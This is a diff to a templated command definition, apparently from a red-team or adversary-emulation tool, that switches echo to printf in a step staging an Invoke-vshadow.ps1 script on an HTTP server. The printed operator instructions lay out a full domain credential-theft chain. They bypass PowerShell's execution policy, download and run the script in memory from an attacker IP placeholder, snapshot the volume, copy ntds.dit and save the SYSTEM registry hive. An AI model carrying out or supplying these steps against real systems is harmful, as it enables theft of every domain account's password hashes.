@@ -7,15 +7,15 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n {{ tools_dir }}/vshadow/Invoke-vshadow.ps1 packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation 1: Open Powershell with administrative privileges'; \
-  echo 'Preparation 2: powershell -ep bypass'; \
-  echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-vshadow.ps1\')'; \
-  echo 'Create Snapshot: Invoke-vshadow -volume \'C:\\\''; \
-  echo 'Extract ntds file: cmd /c copy <shadow copy device>\windows\ntds\ntds.dit {{ delivery_path_windows }}\ntds.dit.bak'; \
-  echo 'Extract system file: reg.exe save hklm\system {{ delivery_path_windows }}\system.bak'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Preparation 1: Open Powershell with administrative privileges'; \
+  printf '%s\n' 'Preparation 2: powershell -ep bypass'; \
+  printf '%s\n' "Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-vshadow.ps1')"; \
+  printf '%s\n' "Create Snapshot: Invoke-vshadow -volume 'C:\\'"; \
+  printf '%s\n' 'Extract ntds file: cmd /c copy <shadow copy device>\windows\ntds\ntds.dit {{ delivery_path_windows }}\ntds.dit.bak'; \
+  printf '%s\n' 'Extract system file: reg.exe save hklm\system {{ delivery_path_windows }}\system.bak'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         -----CMD-----                          '; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
